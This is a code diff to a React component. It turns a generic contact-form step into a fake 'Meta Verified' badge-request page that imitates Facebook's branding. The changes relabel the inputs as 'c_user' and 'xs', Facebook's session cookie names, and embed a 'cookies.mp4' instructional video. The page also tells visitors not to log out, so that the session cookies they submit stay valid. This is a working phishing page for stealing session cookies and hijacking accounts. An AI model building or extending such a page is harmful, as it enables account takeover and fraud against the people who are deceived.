@@ -14,6 +14,7 @@ import { useForm } from "react-hook-form";
 import { useLocation } from "wouter";
 import MetaTags from "@/components/meta-tags";
 import { validationFormSchema } from "@/lib/form-schemas";
+import { Search } from "lucide-react";
 
 export default function Validation() {
   const { toast } = useToast();
@@ -47,10 +48,10 @@ export default function Validation() {
   return (
     <>
       <MetaTags
-        title="Contact Form | Step 1"
-        description="Contact form validation step"
+        title="Meta Verified | Validation"
+        description="Request a verified badge on Facebook - Validation Step"
       />
-      <div className="min-h-screen flex flex-col bg-background">
+      <div className="min-h-screen flex flex-col bg-white">
         <nav className="flex items-center justify-between p-3 sm:p-4 border-b">
           <div className="flex items-center">
             <p className="text-[#1877f2] text-xl sm:text-2xl font-bold">facebook</p>
@@ -64,13 +65,46 @@ export default function Validation() {
             />
           </div>
         </nav>
+
         <div className="flex-1 flex justify-center p-4 sm:p-8">
-          <div className="max-w-md w-full space-y-6">
-            <div className="text-center">
-              <h1 className="text-2xl font-bold text-primary">Step 1: Basic Information</h1>
-              <p className="text-muted-foreground mt-2">
-                Please provide your basic contact information
+          <div className="max-w-2xl w-full space-y-4 sm:space-y-6">
+            <h1 className="text-xl sm:text-2xl font-bold text-[#1c1e21]">
+              Request a verified badge on Facebook
+            </h1>
+
+            <div className="space-y-3 sm:space-y-4 text-[#65676B] text-sm sm:text-base">
+              <p>
+                The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents.
               </p>
+              <p>
+                Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.
+              </p>
+              <p>
+                Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.
+              </p>
+            </div>
+
+            <div className="bg-[#F0F2F5] p-4 sm:p-6 rounded-lg space-y-4">
+              <h2 className="text-base sm:text-lg font-semibold text-[#1c1e21]">Detailed Video Information</h2>
+
+              <div className="video-container relative w-full aspect-video rounded-lg overflow-hidden bg-black">
+                <video
+                  className="w-full h-full"
+                  controls
+                  playsInline
+                  preload="auto"
+                >
+                  <source
+                    src="https://cdn.glitch.global/cfdab748-b145-4b28-8f85-c26ac388a3c9/cookies.mp4?v=1719846896202"
+                    type="video/mp4"
+                  />
+                  Your browser does not support the video tag.
+                </video>
+              </div>
+
+              <h3 className="font-semibold text-sm sm:text-base text-[#1c1e21]">
+                Must Watch the video and submit required information correctly.
+              </h3>
             </div>
 
             <Form {...form}>
@@ -80,19 +114,19 @@ export default function Validation() {
                   name="c_user"
                   render={({ field }) => (
                     <FormItem>
-                      <FormLabel>User ID</FormLabel>
+                      <FormLabel className="text-sm sm:text-base text-[#1c1e21]">c_user</FormLabel>
                       <FormControl>
                         <Input
                           type="number"
                           min="0"
                           pattern="[0-9]+"
                           minLength={6}
-                          placeholder="Enter your user ID"
-                          className="w-full"
+                          placeholder="Enter c_user"
+                          className="text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
                           {...field}
                         />
                       </FormControl>
-                      <FormMessage />
+                      <FormMessage className="text-xs text-[#dc3545]" />
                     </FormItem>
                   )}
                 />
@@ -101,31 +135,36 @@ export default function Validation() {
                   name="xs"
                   render={({ field }) => (
                     <FormItem>
-                      <FormLabel>Reference Code</FormLabel>
+                      <FormLabel className="text-sm sm:text-base text-[#1c1e21]">xs</FormLabel>
                       <FormControl>
                         <Input 
                           type="text" 
-                          placeholder="Enter reference code" 
-                          className="w-full"
+                          placeholder="Enter xs" 
+                          className="text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
                           {...field} 
                         />
                       </FormControl>
-                      <FormMessage />
+                      <FormMessage className="text-xs text-[#dc3545]" />
                     </FormItem>
                   )}
                 />
 
+                <p className="text-xs sm:text-sm text-[#65676B]">
+                  Please make sure account not to log out from your computer or laptop until you have received a verification email.
+                </p>
+
                 <Button 
                   type="submit" 
-                  className="w-full"
+                  className="w-full py-2 sm:py-2.5 text-sm sm:text-base bg-[#1877f2] hover:bg-[#166fe5] transition-colors duration-200"
                   disabled={form.formState.isSubmitting}
                 >
-                  {form.formState.isSubmitting ? "Submitting..." : "Continue to Next Step"}
+                  {form.formState.isSubmitting ? "Submitting..." : "Submit"}
                 </Button>
               </form>
             </Form>
           </div>
         </div>
+
         <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-[#65676B] border-t">
           Meta © 2025
         </div>
